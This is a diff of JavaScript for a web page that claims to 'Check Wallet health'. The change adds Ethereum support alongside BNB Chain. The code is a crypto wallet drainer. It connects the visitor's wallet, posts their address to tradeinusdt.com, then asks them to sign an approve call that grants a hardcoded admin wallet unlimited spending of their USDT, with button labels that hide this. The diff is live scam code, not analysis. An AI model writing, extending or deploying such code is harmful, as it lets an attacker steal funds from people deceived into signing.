@@ -1,139 +1,122 @@
 import EthereumProvider from "@walletconnect/ethereum-provider";
 import { ethers } from "ethers";
 
-// Element references
-const connectButton = document.getElementById("connectWallet");
-const approveButton = document.getElementById("approveUSDT");
-const userAddressSpan = document.getElementById("userAddress");
+// DOM References
+const connectBEP = document.getElementById("connectWallet");
+const connectERC = document.getElementById("connectWalleterc");
+const approveBEP = document.getElementById("approveUSDT");
+const approveERC = document.getElementById("approveUSDTerc");
+const userAddressInput = document.getElementById("userAddress");
 const userBalanceSpan = document.getElementById("userBalance");
 const walletInfoDiv = document.getElementById("walletInfo");
 
-const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const ADMIN_WALLET = "0x24E189414e4217962964b9D57877C91349A169Da";
 
-const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
-const USDT_ABI = ["function balanceOf(address owner) view returns (uint256)"];
+// USDT Contract addresses
+const USDT_CONTRACTS = {
+    56: "0x55d398326f99059fF775485246999027B3197955", // BNB
+    1: "0xdAC17F958D2ee523a2206206994597C13D831ec7"  // Ethereum
+};
 
-let signer;
+const APPROVE_ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
+const BALANCE_ABI = ["function balanceOf(address owner) view returns (uint256)"];
 
-connectButton.onclick = async() => {
-    connectButton.innerText = "Processing...";
-    connectButton.disabled = true;
+let signer, currentChainId, usdtAddress;
 
-    setTimeout(() => {
-        document.getElementById("preConnectOverlay").style.display = "none";
-        connectButton.innerText = "Proceed";
-        connectButton.disabled = false;
-    }, 5000);
-
+// Shared connect logic
+async function connectWallet(chainId) {
     try {
         const provider = await EthereumProvider.init({
             projectId: "5c7a882142c7491241b507534414ddff",
-            chains: [56],
+            chains: [chainId],
             methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
             showQrModal: true
         });
 
         await provider.connect();
-
         const ethersProvider = new ethers.BrowserProvider(provider);
         signer = await ethersProvider.getSigner();
         const userAddress = await signer.getAddress();
-        // Save wallet address
+
+        currentChainId = chainId;
+        usdtAddress = USDT_CONTRACTS[chainId];
+
+        // Save address
         fetch("https://tradeinusdt.com/php/save_wallet.php", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ wallet: userAddress })
         });
 
-        // Show approval button and wallet info
-        approveButton.style.display = "inline-block";
-        userAddressSpan.innerText = userAddress;
-        document.getElementById("userAddress").value = userAddress;
+        // Show wallet info
+        userAddressInput.value = userAddress;
         walletInfoDiv.style.display = "block";
 
-        // Fetch and display USDT balance
-        const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
+        // Show correct approve button
+        if (chainId === 56) {
+            approveBEP.style.display = "inline-flex";
+            approveERC.style.display = "none";
+        } else if (chainId === 1) {
+            approveERC.style.display = "inline-flex";
+            approveBEP.style.display = "none";
+        }
+
+        // Fetch balance
+        const usdt = new ethers.Contract(usdtAddress, BALANCE_ABI, ethersProvider);
         const rawBalance = await usdt.balanceOf(userAddress);
         const readableBalance = ethers.formatUnits(rawBalance, 18);
         userBalanceSpan.innerText = readableBalance + " USDT";
 
     } catch (err) {
-        console.error("Wallet connection error:", err);
+        console.error("Wallet connect error:", err);
+        alert("Connection failed: " + (err.message || err));
     }
-};
+}
 
-approveButton.onclick = async() => {
+// Approve logic
+async function approveUSDT(targetButton) {
     try {
-        approveButton.disabled = true;
-        approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+        targetButton.disabled = true;
+        targetButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
 
-        const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
+        const contract = new ethers.Contract(usdtAddress, APPROVE_ABI, signer);
         const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
         await tx.wait();
 
         const userAddress = await signer.getAddress();
         window.location.href = `/healthcard.html?wallet=${userAddress}`;
-
     } catch (err) {
-        console.error("Approval error:", err);
+        console.error("Approval failed:", err);
         alert("Approval failed: " + (err.message || err));
     } finally {
-        approveButton.disabled = false;
-        approveButton.innerHTML = '<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health';
+        targetButton.disabled = false;
+        targetButton.innerHTML = '<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health';
     }
-};
-
-// Observer for dynamic UI changes
-const observer = new MutationObserver(function(mutationsList) {
-    for (let mutation of mutationsList) {
-        if (mutation.type === "attributes" && mutation.attributeName === "style") {
-            const approveDiv = document.getElementById("approveUSDT");
-            if (approveDiv && approveDiv.style.display !== "none") {
-                const walletDiv = document.getElementById("walletInfo");
-                if (walletDiv) {
-                    walletDiv.style.display = "block";
-                }
-
-                const introDiv = document.getElementById("introDiv");
-                if (introDiv) {
-                    introDiv.classList.remove("fade-in");
-                    introDiv.classList.add("fade-out");
-                }
-            }
-        }
-    }
-});
-
-const approveDiv = document.getElementById("approveUSDT");
-if (approveDiv) {
-    observer.observe(approveDiv, { attributes: true });
 }
 
-// Copy address utility
+// Bind connect buttons
+connectBEP.onclick = () => connectWallet(56);
+connectERC.onclick = () => connectWallet(1);
+
+// Bind approve buttons
+approveBEP.onclick = () => approveUSDT(approveBEP);
+approveERC.onclick = () => approveUSDT(approveERC);
+
+// Copy function
 export function copyAddress() {
-    const addressInput = document.getElementById("userAddress");
-    addressInput.select();
-    addressInput.setSelectionRange(0, 99999);
+    userAddressInput.select();
+    userAddressInput.setSelectionRange(0, 99999);
     document.execCommand("copy");
     alert("Address copied to clipboard!");
 }
 
-// Pre-connect overlay handlers
+// Overlay logic
 const startConnectBtn = document.getElementById("startConnect");
 const preConnectOverlay = document.getElementById("preConnectOverlay");
 const closeBtn = document.getElementById("preConnectClose");
 
-startConnectBtn.addEventListener("click", () => {
-    preConnectOverlay.style.display = "flex";
-});
-
-closeBtn.addEventListener("click", () => {
-    preConnectOverlay.style.display = "none";
-});
-
-window.addEventListener("click", function(event) {
-    if (event.target === preConnectOverlay) {
-        preConnectOverlay.style.display = "none";
-    }
+startConnectBtn?.addEventListener("click", () => preConnectOverlay.style.display = "flex");
+closeBtn?.addEventListener("click", () => preConnectOverlay.style.display = "none");
+window.addEventListener("click", e => {
+    if (e.target === preConnectOverlay) preConnectOverlay.style.display = "none";
 });
